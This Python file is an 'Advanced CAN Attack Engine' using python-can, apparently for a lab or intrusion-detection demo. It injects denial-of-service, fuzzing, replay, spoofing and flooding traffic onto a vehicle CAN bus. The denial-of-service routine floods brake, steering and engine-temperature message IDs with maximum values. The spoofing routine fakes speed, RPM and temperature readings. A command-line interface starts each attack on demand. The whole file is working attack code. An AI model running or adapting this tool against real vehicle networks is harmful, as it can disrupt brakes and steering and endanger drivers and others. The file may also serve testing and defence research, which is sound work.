import can
import time
import random
import asyncio
from datetime import datetime
from config import *

class AttackEngine:
    def __init__(self):
        self.bus = can.interface.Bus(channel=CAN_CHANNEL, interface=CAN_INTERFACE)
        self.is_attacking = False
        self.current_attack = None
        self.attack_task = None
        self.message_history = []
        
    async def start_attack(self, attack_type, duration=None):
        """Start a specific type of attack"""
        if self.is_attacking:
            await self.stop_attack()
            
        self.current_attack = attack_type
        self.is_attacking = True
        
        attack_methods = {
            "DOS": self._dos_attack,
            "FUZZING": self._fuzzing_attack,
            "REPLAY": self._replay_attack,
            "SPOOFING": self._spoofing_attack,
            "FLOODING": self._flooding_attack
        }
        
        if attack_type in attack_methods:
            self.attack_task = asyncio.create_task(attack_methods[attack_type](duration))
            print(f"🚨 Started {ATTACK_TYPES[attack_type]['name']} attack")
        else:
            print(f"❌ Unknown attack type: {attack_type}")
            self.is_attacking = False
    
    async def stop_attack(self):
        """Stop current attack"""
        self.is_attacking = False
        if self.attack_task and not self.attack_task.done():
            self.attack_task.cancel()
            try:
                await self.attack_task
            except asyncio.CancelledError:
                pass
        print(f"🛑 Stopped {self.current_attack} attack")
        self.current_attack = None
    
    async def _send_message_async(self, msg_id, data, attack_type):
        """Send CAN message with attack metadata (async)"""
        await asyncio.get_event_loop().run_in_executor(None, self._send_message, msg_id, data, attack_type)
    
    def _send_message(self, msg_id, data, attack_type):
        """Send CAN message with attack metadata"""
        try:
            msg = can.Message(arbitration_id=msg_id, data=data, is_extended_id=False)
            self.bus.send(msg)
            
            # Log attack details
            attack_info = {
                'timestamp': datetime.now(),
                'attack_type': attack_type,
                'msg_id': msg_id,
                'data': list(data)
            }
            self.message_history.append(attack_info)
            
            print(f"{ATTACK_TYPES[attack_type]['icon']} {attack_type}: ID=0x{msg_id:03X}, Data={list(data)}")
            
        except Exception as e:
            print(f"❌ Error sending message: {e}")
    
    async def _dos_attack(self, duration):
        """Denial of Service - flood with high-priority messages"""
        start_time = time.time()
        params = ATTACK_PARAMS["DOS"]
        
        while self.is_attacking and (not duration or time.time() - start_time < duration):
            # Flood critical systems
            for _ in range(params["burst_count"]):
                if not self.is_attacking:
                    break
                    
                # Target critical IDs
                critical_ids = [CAN_IDS["BRAKE"], CAN_IDS["STEERING"], CAN_IDS["ENGINE_TEMP"]]
                msg_id = random.choice(critical_ids)
                data = [0xFF] * 8  # Max values to cause system stress
                
                await self._send_message_async(msg_id, data, "DOS")
                await asyncio.sleep(params["interval"])
            
            await asyncio.sleep(0.1)  # Brief pause between bursts
    
    async def _fuzzing_attack(self, duration):
        """Fuzzing - send random/malformed data"""
        start_time = time.time()
        
        while self.is_attacking and (not duration or time.time() - start_time < duration):
            # Use random IDs outside normal range
            msg_id = random.randint(0x600, 0x7FF)  # High ID range
            
            # Send malformed data patterns
            patterns = [
                [0xFF] * 8,  # All max values
                [0x00] * 8,  # All zeros
                [random.randint(0, 255) for _ in range(8)],  # Random
                [0xAA, 0x55] * 4,  # Alternating pattern
            ]
            data = random.choice(patterns)
            
            await self._send_message_async(msg_id, data, "FUZZING")
            await asyncio.sleep(random.uniform(0.1, 0.3))
    
    async def _replay_attack(self, duration):
        """Replay - capture and replay legitimate messages"""
        start_time = time.time()
        params = ATTACK_PARAMS["REPLAY"]
        
        # First, capture some legitimate messages
        captured_messages = []
        print("📡 Capturing legitimate messages for replay...")
        
        capture_start = time.time()
        while len(captured_messages) < 10 and time.time() - capture_start < 5:
            try:
                msg = self.bus.recv(timeout=1.0)
                if msg and msg.arbitration_id in CAN_IDS.values():
                    captured_messages.append((msg.arbitration_id, list(msg.data)))
            except:
                continue
        
        if not captured_messages:
            print("⚠️ No messages captured, using default messages")
            captured_messages = [
                (CAN_IDS["SPEED"], [60]),
                (CAN_IDS["RPM"], [0x0F, 0xA0])  # 4000 RPM
            ]
        
        # Now replay them
        while self.is_attacking and (not duration or time.time() - start_time < duration):
            for msg_id, data in captured_messages:
                if not self.is_attacking:
                    break
                    
                # Replay multiple times
                for _ in range(params["replay_count"]):
                    await self._send_message_async(msg_id, data, "REPLAY")
                    await asyncio.sleep(params["interval"])
            
            await asyncio.sleep(1)
    
    async def _spoofing_attack(self, duration):
        """Spoofing - send fake but realistic-looking data"""
        start_time = time.time()
        
        while self.is_attacking and (not duration or time.time() - start_time < duration):
            # Send clearly unrealistic values
            attack_scenarios = [
                (CAN_IDS["SPEED"], [min(255, random.randint(250, 255))]),  # Impossible speed
                (CAN_IDS["RPM"], [255, 255]),  # Max RPM bytes
                (CAN_IDS["ENGINE_TEMP"], [min(255, random.randint(150, 200))]),  # Overheating
            ]
            
            msg_id, data = random.choice(attack_scenarios)
            await self._send_message_async(msg_id, data, "SPOOFING")
            await asyncio.sleep(random.uniform(0.3, 1.0))
    
    async def _flooding_attack(self, duration):
        """Flooding - overwhelm the bus with legitimate-looking messages"""
        start_time = time.time()
        params = ATTACK_PARAMS["FLOODING"]
        
        message_interval = 1.0 / params["message_rate"]  # Calculate interval for desired rate
        
        while self.is_attacking and (not duration or time.time() - start_time < duration):
            # Send legitimate-looking but excessive messages
            for msg_id in CAN_IDS.values():
                if not self.is_attacking:
                    break
                    
                # Generate realistic but excessive data
                if msg_id == CAN_IDS["SPEED"]:
                    data = [random.randint(0, 200)]
                elif msg_id == CAN_IDS["RPM"]:
                    rpm = random.randint(800, 6000)
                    data = list(rpm.to_bytes(2, byteorder='big'))
                else:
                    data = [random.randint(0, 100)]
                
                await self._send_message_async(msg_id, data, "FLOODING")
                await asyncio.sleep(message_interval)
    
    def get_attack_status(self):
        """Get current attack status"""
        return {
            'is_attacking': self.is_attacking,
            'current_attack': self.current_attack,
            'messages_sent': len(self.message_history),
            'last_message': self.message_history[-1] if self.message_history else None
        }
    
    def clear_history(self):
        """Clear message history"""
        self.message_history.clear()

# CLI interface for manual testing
async def main():
    engine = AttackEngine()
    
    print("🎯 Advanced CAN Attack Engine")
    print("Available attacks:", list(ATTACK_TYPES.keys())[:-1])  # Exclude NORMAL
    print("Commands: start <attack_type> [duration], stop, status, quit")
    
    try:
        while True:
            cmd = await asyncio.get_event_loop().run_in_executor(None, input, "\n> ")
            cmd = cmd.strip().split()
            
            if not cmd:
                continue
            elif cmd[0] == "start" and len(cmd) >= 2:
                attack_type = cmd[1].upper()
                duration = int(cmd[2]) if len(cmd) > 2 else None
                await engine.start_attack(attack_type, duration)
            elif cmd[0] == "stop":
                await engine.stop_attack()
            elif cmd[0] == "status":
                status = engine.get_attack_status()
                print(f"Status: {status}")
            elif cmd[0] == "quit":
                await engine.stop_attack()
                break
            else:
                print("Invalid command")
                
    except KeyboardInterrupt:
        await engine.stop_attack()
        print("\n👋 Attack engine stopped")

if __name__ == "__main__":
    asyncio.run(main())